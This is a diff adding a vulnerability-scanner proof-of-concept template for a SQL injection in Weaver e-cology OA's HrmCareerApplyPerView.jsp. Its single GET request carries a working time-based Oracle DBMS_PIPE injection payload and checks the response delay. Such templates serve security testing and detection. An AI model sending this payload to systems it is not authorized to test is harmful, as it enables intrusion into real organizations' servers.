@@ -1,0 +1,15 @@
+id: poc-yaml-weaver-ecology-hrmcareerapplyperviewsql-injection
+info:
+  name: 泛微OA-E-Cology-HrmCareerApplyPerView-SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-cology
+variables:
+  t1: random_int(3,8)
+requests:
+- method: GET
+  path: /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20AND%201745=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(82)||CHR(67)||CHR(81),{{.t1}})
+  expression: status_code == 200 && duration > 2*t1 && contains(gbk_decode(body),
+    "/U>-编辑</BUTTON")
+transport: http
